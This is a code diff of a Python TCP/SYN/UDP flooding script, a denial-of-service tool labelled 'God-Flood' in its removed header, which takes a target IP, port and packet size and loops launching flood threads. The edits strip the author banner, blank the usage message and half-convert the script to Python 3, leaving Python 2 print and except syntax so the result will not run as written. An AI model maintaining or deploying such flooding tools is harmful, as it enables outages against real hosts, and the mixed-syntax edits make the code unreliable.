@@ -1,9 +1,13 @@
 #!/usr/bin/env python
-#God-Flood(tcp,syn,udp) by LiGhT
-import threading, sys, time, random, socket
+import os
+import threading
+import sys
+import time
+import random
+import socket
 
 if len(sys.argv) < 4:
-    print "God-Flood By LiGhT"
+    print("")
     sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
 
 ip = sys.argv[1]
@@ -72,7 +76,7 @@ while True:
         t.start()
         s.start()
     except KeyboardInterrupt:
-        print "Stopping Flood!"
+        print(f"Stopping Flood!")
         sys.exit()
     except socket.error, msg:
         print "Socket Couldn't Connect"
